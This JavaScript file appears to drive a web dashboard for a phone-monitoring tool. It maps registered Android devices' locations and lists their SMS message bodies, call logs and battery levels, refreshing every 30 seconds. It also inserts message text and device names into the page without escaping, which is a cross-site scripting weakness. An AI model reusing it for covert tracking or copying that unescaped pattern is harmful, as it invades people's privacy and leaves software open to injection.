let map;
let markers = [];
let currentTab = 'locations';

function initMap() {
    map = L.map('map').setView([20, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);
}

function formatTime(ts) {
    if (!ts) return 'N/A';
    const d = new Date(ts);
    return d.toLocaleString();
}

function formatDuration(seconds) {
    if (!seconds) return '0s';
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    if (h > 0) return `${h}h ${m}m`;
    if (m > 0) return `${m}m ${s}s`;
    return `${s}s`;
}

function callTypeName(type) {
    const types = { 1: 'Incoming', 2: 'Outgoing', 3: 'Missed', 4: 'Voicemail', 5: 'Rejected', 6: 'Blocked' };
    return types[type] || `Type ${type}`;
}

function smsTypeName(type) {
    const types = { 1: 'Inbox', 2: 'Sent', 3: 'Draft', 4: 'Outbox', 5: 'Failed', 6: 'Queued' };
    return types[type] || `Type ${type}`;
}

function isOnline(lastSeen) {
    if (!lastSeen) return false;
    const diff = Date.now() - lastSeen;
    return diff < 600000; // 10 minutes
}

async function loadDashboard() {
    try {
        const [devicesRes, locationsRes] = await Promise.all([
            fetch('/api/devices'),
            fetch('/api/devices?limit=500')
        ]);
        const devices = await devicesRes.json();

        // Stats
        let totalLocations = 0, totalSms = 0, totalCalls = 0;
        devices.forEach(d => {
            totalLocations += d.location_count || 0;
            totalSms += d.sms_count || 0;
            totalCalls += d.call_count || 0;
        });

        document.getElementById('totalDevices').textContent = devices.length;
        document.getElementById('totalLocations').textContent = totalLocations;
        document.getElementById('totalSms').textContent = totalSms;
        document.getElementById('totalCalls').textContent = totalCalls;

        // Device list
        const deviceList = document.getElementById('deviceList');
        const onlineCount = devices.filter(d => isOnline(d.last_seen)).length;
        document.getElementById('deviceCount').textContent = `${onlineCount} online`;

        if (devices.length === 0) {
            deviceList.innerHTML = '<div class="loading">No devices registered yet</div>';
        } else {
            deviceList.innerHTML = devices.map(d => {
                const online = isOnline(d.last_seen);
                return `
                    <div class="device-item" onclick="window.location='/device/${d.device_id}'">
                        <div class="device-name">
                            <span class="device-status ${online ? 'online' : 'offline'}"></span>
                            ${d.device_name || d.device_id}
                        </div>
                        <div class="device-meta">
                            ${d.manufacturer || ''} ${d.model || ''} &middot; Android ${d.android_version || '?'}
                            &middot; Last seen: ${formatTime(d.last_seen)}
                            ${d.last_battery != null ? `&middot; Battery: ${d.last_battery}%` : ''}
                        </div>
                    </div>
                `;
            }).join('');
        }

        // Map markers
        map.eachLayer(layer => {
            if (layer instanceof L.Marker) map.removeLayer(layer);
        });

        const bounds = [];
        for (const d of devices) {
            if (d.last_location) {
                const [lat, lon] = d.last_location.split(',').map(Number);
                if (lat && lon) {
                    const marker = L.marker([lat, lon])
                        .addTo(map)
                        .bindPopup(`
                            <b>${d.device_name || d.device_id}</b><br>
                            ${d.manufacturer || ''} ${d.model || ''}<br>
                            Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}<br>
                            Battery: ${d.last_battery != null ? d.last_battery + '%' : 'N/A'}
                        `);
                    bounds.push([lat, lon]);
                }
            }
        }
        if (bounds.length > 0) {
            map.fitBounds(bounds, { padding: [50, 50] });
        }

    } catch (err) {
        console.error('Failed to load dashboard:', err);
    }
}

async function loadRecentActivity(tab) {
    currentTab = tab;
    const container = document.getElementById('recentActivity');

    try {
        const devices = await (await fetch('/api/devices')).json();
        if (devices.length === 0) {
            container.innerHTML = '<div class="loading">No data yet</div>';
            return;
        }

        const deviceId = devices[0].device_id;
        let data;

        if (tab === 'locations') {
            data = await (await fetch(`/api/devices/${deviceId}/locations?limit=20`)).json();
            container.innerHTML = data.length === 0
                ? '<div class="loading">No locations</div>'
                : data.map(l => `
                    <div class="activity-item">
                        <strong>Location</strong> &middot;
                        ${l.latitude.toFixed(6)}, ${l.longitude.toFixed(6)}
                        (acc: ${l.accuracy}m) &middot;
                        ${l.provider} &middot;
                        <span class="time">${formatTime(l.timestamp)}</span>
                    </div>
                `).join('');
        } else if (tab === 'sms') {
            data = await (await fetch(`/api/devices/${deviceId}/sms?limit=20`)).json();
            container.innerHTML = data.length === 0
                ? '<div class="loading">No SMS</div>'
                : data.map(s => `
                    <div class="activity-item">
                        <strong>[${smsTypeName(s.type)}]</strong>
                        ${s.address} &middot;
                        ${(s.body || '').substring(0, 80)}${(s.body || '').length > 80 ? '...' : ''} &middot;
                        <span class="time">${formatTime(s.date)}</span>
                    </div>
                `).join('');
        } else if (tab === 'calls') {
            data = await (await fetch(`/api/devices/${deviceId}/calls?limit=20`)).json();
            container.innerHTML = data.length === 0
                ? '<div class="loading">No calls</div>'
                : data.map(c => `
                    <div class="activity-item">
                        <strong>${callTypeName(c.type)}</strong>
                        ${c.number} ${c.name ? '(' + c.name + ')' : ''} &middot;
                        Duration: ${formatDuration(c.duration)} &middot;
                        <span class="time">${formatTime(c.date)}</span>
                    </div>
                `).join('');
        }

    } catch (err) {
        console.error('Failed to load activity:', err);
        container.innerHTML = '<div class="loading">Error loading data</div>';
    }
}

// Tab switching
document.addEventListener('click', function(e) {
    if (e.target.classList.contains('tab')) {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        e.target.classList.add('active');
        loadRecentActivity(e.target.dataset.tab);
    }
});

// Initialize
initMap();
loadDashboard();
loadRecentActivity('locations');

// Auto-refresh every 30 seconds
setInterval(loadDashboard, 30000);
